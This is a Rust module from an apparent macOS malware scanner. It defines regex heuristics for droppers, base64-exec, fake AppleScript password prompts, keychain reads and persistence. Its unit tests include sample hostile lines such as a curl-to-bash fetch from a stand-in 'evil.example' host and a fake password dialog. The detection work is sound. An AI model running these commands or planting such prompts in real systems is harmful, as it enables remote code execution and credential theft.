//! Script / obfuscation heuristics (Engine 3, text path).
//!
//! Targets the dominant macOS stealer/dropper patterns of 2024-2026: pipe-to-shell
//! droppers, base64-decode-and-exec, AppleScript fake-password prompts, and
//! interpreter one-liners. Each match contributes a *score*; combinations of
//! decode + exec + network are weighted higher than any single token.

use std::sync::OnceLock;

use regex::Regex;

use crate::engine::verdict::{Detection, Engine, Severity};

struct Pattern {
    re: Regex,
    name: &'static str,
    score: u32,
    severity: Severity,
    reason: &'static str,
}

fn patterns() -> &'static [Pattern] {
    static PATTERNS: OnceLock<Vec<Pattern>> = OnceLock::new();
    PATTERNS.get_or_init(|| {
        let p = |re: &str, name, score, severity, reason| Pattern {
            re: Regex::new(re).expect("valid heuristic regex"),
            name,
            score,
            severity,
            reason,
        };
        vec![
            p(
                r"(?i)\b(curl|wget)\b[^\n|]{0,300}\|\s*(sh|bash|zsh)\b",
                "pipe_to_shell_dropper",
                45,
                Severity::High,
                "downloads a remote payload and pipes it straight into a shell",
            ),
            p(
                r"(?i)\bbase64\b[^\n]{0,40}(-d|-D|--decode)\b[^\n]{0,80}\|\s*(sh|bash|zsh|python|perl)\b",
                "base64_decode_exec",
                40,
                Severity::High,
                "decodes a base64 blob and executes it in-memory",
            ),
            p(
                r"(?is)display dialog[^\n]{0,200}with hidden answer",
                "applescript_password_prompt",
                40,
                Severity::High,
                "AppleScript fake password dialog (keychain-theft technique)",
            ),
            p(
                r"(?i)\bosascript\b[^\n]{0,200}\b(-e|-l\s+JavaScript)\b",
                "osascript_inline",
                15,
                Severity::Medium,
                "inline osascript execution",
            ),
            p(
                r"(?i)\b(python3?|perl|ruby)\b\s+-(c|e)\b[^\n]{0,200}(base64|exec|eval|decode|__import__)",
                "interpreter_oneliner",
                30,
                Severity::Medium,
                "interpreter one-liner with decode/exec payload",
            ),
            p(
                r#"\beval\s*[("]"#,
                "eval_invocation",
                10,
                Severity::Low,
                "dynamic eval invocation",
            ),
            p(
                r"(?i)\bDYLD_INSERT_LIBRARIES\b",
                "dyld_insert",
                25,
                Severity::Medium,
                "DYLD_INSERT_LIBRARIES dylib injection",
            ),
            p(
                r"(?i)launchctl\s+(load|bootstrap|submit)\b",
                "launchctl_persistence",
                15,
                Severity::Low,
                "registers a launchd job (possible persistence)",
            ),
            p(
                r"(?i)\bsecurity\s+(dump-keychain|find-(generic|internet)-password)\b",
                "keychain_access",
                30,
                Severity::Medium,
                "reads secrets from the macOS keychain",
            ),
            // Long contiguous base64 blob (>= 512 chars) — staged payload.
            p(
                r"[A-Za-z0-9+/]{512,}={0,2}",
                "large_base64_blob",
                20,
                Severity::Low,
                "embedded large base64 blob (possible packed payload)",
            ),
            // Long hex-encoded payload.
            p(
                r"(?i)(\\x[0-9a-f]{2}){16,}",
                "hex_payload",
                15,
                Severity::Low,
                "embedded long hex-encoded byte string",
            ),
        ]
    })
}

/// Scan text content for obfuscation/dropper heuristics.
pub fn scan_text(content: &[u8]) -> Vec<Detection> {
    // Only meaningful on text; operate on a lossy UTF-8 view.
    let text = String::from_utf8_lossy(content);
    let mut out = Vec::new();
    for p in patterns() {
        if p.re.is_match(&text) {
            out.push(Detection::new(
                Engine::Script,
                p.name,
                p.score,
                p.severity,
                false,
                p.reason,
            ));
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_curl_pipe_shell() {
        let d = scan_text(b"#!/bin/sh\ncurl -fsSL http://evil.example/x.sh | bash\n");
        assert!(d.iter().any(|d| d.name == "pipe_to_shell_dropper"));
    }

    #[test]
    fn flags_base64_exec() {
        let d = scan_text(b"echo ZWNobyBoaQ== | base64 -d | bash\n");
        assert!(d.iter().any(|d| d.name == "base64_decode_exec"));
    }

    #[test]
    fn flags_fake_password_prompt() {
        let s = br#"osascript -e 'display dialog "App needs your password" with hidden answer'"#;
        let d = scan_text(s);
        assert!(d.iter().any(|d| d.name == "applescript_password_prompt"));
    }

    #[test]
    fn clean_script_has_no_findings() {
        let d = scan_text(b"#!/bin/bash\necho 'hello world'\nls -la\n");
        assert!(d.is_empty(), "unexpected: {d:?}");
    }
}
